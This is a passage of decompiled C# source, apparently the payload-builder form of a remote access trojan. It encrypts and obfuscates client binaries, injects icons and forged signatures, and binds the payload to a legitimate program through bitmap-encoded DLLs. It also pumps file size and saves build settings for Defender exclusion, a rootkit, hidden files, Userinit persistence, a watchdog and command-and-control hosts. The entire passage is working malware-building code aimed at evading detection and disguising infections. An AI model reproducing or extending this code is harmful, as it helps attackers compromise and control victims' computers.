							{
								if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
								{
									string a = methodDef.Body.Instructions[i].Operand.ToString();
									if (!(a == "%enc%"))
									{
										if (!(a == "%dec%"))
										{
											if (!(a == "%name%"))
											{
												if (!(a == "%runas%"))
												{
													if (!(a == "%antivirtual%"))
													{
														if (!typeDef.Name.Contains("Caesars"))
														{
															methodDef.Body.Instructions[i].Operand = encryptString.Encrypt((string)methodDef.Body.Instructions[i].Operand);
														}
													}
													else
													{
														methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
													}
												}
												else
												{
													methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
												}
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharacters);
											}
										}
										else
										{
											methodDef.Body.Instructions[i].Operand = encryptString.dec;
										}
									}
									else
									{
										methodDef.Body.Instructions[i].Operand = encryptString.enc;
									}
								}
							}
						}
					}
				}
				Mixer.Execute(moduleDefMD);
				Renamer.Execute(moduleDefMD);
				ControlFlowObfuscation.Execute(moduleDefMD);
				ManyProxy.Execute(moduleDefMD);
				ProxyCall.Execute(moduleDefMD);
				ProxyString.Execute(moduleDefMD);
				Int.Execute(moduleDefMD);
				ProxyInt.Execute(moduleDefMD);
				Junks.Execute(moduleDefMD);
				moduleDefMD.Write(text);
				moduleDefMD.Dispose();
			}
			this.WriteAssembly(bulid, text);
			IconInjector.InjectIcon(text, Methods.GetIcon(bulid));
			if (this.checkBox22.Checked)
			{
				this.PatchSignature(text, exd);
			}
		}

		// Token: 0x060003EB RID: 1003 RVA: 0x0002C2A0 File Offset: 0x0002A4A0
		public void BulidJoin(string original, string bulid)
		{
			string text = Path.Combine(Path.GetDirectoryName(bulid), Path.GetFileName(original));
			string exd = "";
			if (this.checkBox22.Checked)
			{
				if (text.EndsWith(".exe"))
				{
					exd = ".exe";
				}
				if (text.EndsWith(".scr"))
				{
					exd = ".scr";
				}
				text = text.Replace(".exe", "").Replace(".scr", "");
			}
			using (ModuleDefMD moduleDefMD = ModuleDefMD.Load(original, new ModuleCreationOptions { TryToLoadPdbFromDisk = false }))
			{
				string text2 = Randomizer.LegalNaming[0] + ".dll";
				string text3 = Randomizer.LegalNaming[1] + ".dll";
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(original)).Save(Path.Combine(Path.GetDirectoryName(bulid), text2), ImageFormat.Bmp);
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(Path.Combine(Path.GetDirectoryName(bulid), text3), ImageFormat.Bmp);
				EncryptString encryptString = new EncryptString();
				string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
				encryptString.dec = Randomizer.Shuffle(str);
				encryptString.enc = Randomizer.Shuffle(encryptString.dec);
				foreach (TypeDef typeDef in moduleDefMD.Types)
				{
					foreach (MethodDef methodDef in typeDef.Methods)
					{
						for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
						{
							if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
							{
								string a = methodDef.Body.Instructions[i].Operand.ToString();
								if (!(a == "%enc%"))
								{
									if (!(a == "%dec%"))
									{
										if (!(a == "%names%"))
										{
											if (!(a == "%runas%"))
											{
												if (!(a == "%antivirtual%"))
												{
													if (!typeDef.Name.Contains("Caesars"))
													{
														methodDef.Body.Instructions[i].Operand = encryptString.Encrypt((string)methodDef.Body.Instructions[i].Operand);
													}
												}
												else
												{
													methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
												}
											}
											else
											{
												methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
											}
										}
										else
										{
											methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(text2 + "," + text3);
										}
									}
									else
									{
										methodDef.Body.Instructions[i].Operand = encryptString.dec;
									}
								}
								else
								{
									methodDef.Body.Instructions[i].Operand = encryptString.enc;
								}
							}
						}
					}
				}
				Mixer.Execute(moduleDefMD);
				Renamer.Execute(moduleDefMD);
				ControlFlowObfuscation.Execute(moduleDefMD);
				ManyProxy.Execute(moduleDefMD);
				ProxyCall.Execute(moduleDefMD);
				ProxyString.Execute(moduleDefMD);
				Int.Execute(moduleDefMD);
				ProxyInt.Execute(moduleDefMD);
				Junks.Execute(moduleDefMD);
				moduleDefMD.Write(text);
				moduleDefMD.Dispose();
			}
			try
			{
				this.WriteAssembly(original, text);
			}
			catch
			{
			}
			IconInjector.InjectIcon(text, Methods.GetIcon(original));
			if (this.checkBox22.Checked)
			{
				this.PatchSignature(text, exd);
			}
		}

		// Token: 0x060003EC RID: 1004 RVA: 0x0002C6E8 File Offset: 0x0002A8E8
		private void rjButton8_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
				saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.CreateBulid(saveFileDialog.FileName);
					this.BulidDropper(saveFileDialog.FileName);
					MessageBox.Show("Build Create!");
				}
			}
		}

		// Token: 0x060003ED RID: 1005 RVA: 0x0002C784 File Offset: 0x0002A984
		private void rjButton9_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Title = "Choose program";
				openFileDialog.Filter = "Files(*.exe)|*.exe";
				openFileDialog.Multiselect = false;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
						saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
						saveFileDialog.OverwritePrompt = false;
						saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							this.CreateBulid(saveFileDialog.FileName);
							this.BulidDropper(saveFileDialog.FileName);
							this.BulidJoin(openFileDialog.FileName, saveFileDialog.FileName);
							File.Delete(saveFileDialog.FileName);
							MessageBox.Show("Build Create!");
						}
					}
				}
			}
		}

		// Token: 0x060003EE RID: 1006 RVA: 0x0002C884 File Offset: 0x0002AA84
		private void rjButton10_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
				saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.CreateBulid(saveFileDialog.FileName);
					this.BulidDropper(saveFileDialog.FileName);
					this.Pump(saveFileDialog.FileName);
					MessageBox.Show("Build Create!");
				}
			}
		}

		// Token: 0x060003EF RID: 1007 RVA: 0x0002C92C File Offset: 0x0002AB2C
		private void rjButton12_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = ".json (*.json)|*.json";
				openFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText(openFileDialog.FileName));
					this.checkBox20.Checked = bulidData.CheckIcon;
					this.checkBox21.Checked = bulidData.CheckAssembly;
					this.checkBox22.Checked = bulidData.DigitalSignature;
					if (bulidData.CheckIcon)
					{
						File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
						this.pictureBox1.ImageLocation = "local\\temp.ico";
					}
					this.GridIps.Rows.Clear();
					foreach (string value in bulidData.Hosts)
					{
						DataGridViewRow dataGridViewRow = new DataGridViewRow();
						dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
						{
							Value = value
						});
						this.GridIps.Rows.Add(dataGridViewRow);
					}
					this.TextBoxProduct.Texts = bulidData.Product;
					this.TextBoxDescription.Texts = bulidData.Description;
					this.TextBoxCompany.Texts = bulidData.Company;
					this.TextBoxCopyright.Texts = bulidData.Copyright;
					this.TextBoxTrademarks.Texts = bulidData.Trademarks;
					this.TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
					this.TextBoxProductVersion.Texts = bulidData.ProductVersion;
					this.TextBoxFileVersion.Texts = bulidData.FileVersion;
					this.checkBox1.Checked = bulidData.Install;
					this.checkBox8.Checked = bulidData.ExclusionWD;
					this.checkBox6.Checked = bulidData.HiddenFile;
					this.checkBox4.Checked = bulidData.RootKit;
					this.checkBox9.Checked = bulidData.Pump;
					this.checkBox7.Checked = bulidData.UserInit;
					this.checkBox5.Checked = bulidData.InstallWatchDog;
					this.rjTextBox2.Texts = bulidData.TaskClient;
					this.rjTextBox5.Texts = bulidData.TaskWatchDog;
					this.rjComboBox1.Texts = bulidData.PathClientCmb;
					this.rjTextBox3.Texts = bulidData.PathClientBox;
					this.rjComboBox2.Texts = bulidData.PathWatchDogCmb;
					this.rjTextBox4.Texts = bulidData.PathWatchDogBox;
					this.rjTextBox7.Texts = bulidData.Group;
					this.rjTextBox6.Texts = bulidData.Mutex;
				}
			}
		}

		// Token: 0x060003F0 RID: 1008 RVA: 0x0002CBEC File Offset: 0x0002ADEC
		private void rjButton11_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Filter = ".json (*.json)|*.json";
				saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					BulidData bulidData = new BulidData();
					bulidData.CheckIcon = this.checkBox20.Checked;
					bulidData.CheckAssembly = this.checkBox21.Checked;
					bulidData.DigitalSignature = this.checkBox22.Checked;
					bulidData.Icon = (this.checkBox20.Checked ? File.ReadAllBytes(this.pictureBox1.ImageLocation) : null);
					bulidData.Product = this.TextBoxProduct.Texts;
					bulidData.Description = this.TextBoxDescription.Texts;
					bulidData.Company = this.TextBoxCompany.Texts;
					bulidData.Copyright = this.TextBoxCopyright.Texts;
					bulidData.Trademarks = this.TextBoxTrademarks.Texts;
					bulidData.OriginalFilename = this.TextBoxOriginalFileName.Texts;
					bulidData.ProductVersion = this.TextBoxProductVersion.Texts;
					bulidData.FileVersion = this.TextBoxFileVersion.Texts;
					bulidData.Install = this.checkBox1.Checked;
					bulidData.ExclusionWD = this.checkBox8.Checked;
					bulidData.HiddenFile = this.checkBox6.Checked;
					bulidData.RootKit = this.checkBox4.Checked;
					bulidData.Pump = this.checkBox9.Checked;
					bulidData.UserInit = this.checkBox7.Checked;
					bulidData.InstallWatchDog = this.checkBox5.Checked;
					bulidData.TaskClient = this.rjTextBox2.Texts;
					bulidData.TaskWatchDog = this.rjTextBox5.Texts;
					bulidData.PathClientCmb = this.rjComboBox1.Texts;
					bulidData.PathClientBox = this.rjTextBox3.Texts;
					bulidData.PathWatchDogCmb = this.rjComboBox2.Texts;
					bulidData.PathWatchDogBox = this.rjTextBox4.Texts;
					bulidData.Group = this.rjTextBox7.Texts;
					bulidData.Mutex = this.rjTextBox6.Texts;
					List<string> list = new List<string>();
					foreach (object obj in ((IEnumerable)this.GridIps.Rows))
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						list.Add((string)dataGridViewRow.Cells[0].Value);
					}
					bulidData.Hosts = list.ToArray();
					File.WriteAllText(saveFileDialog.FileName, JsonConvert.SerializeObject(bulidData, Formatting.Indented));
				}
			}
		}
	}
}
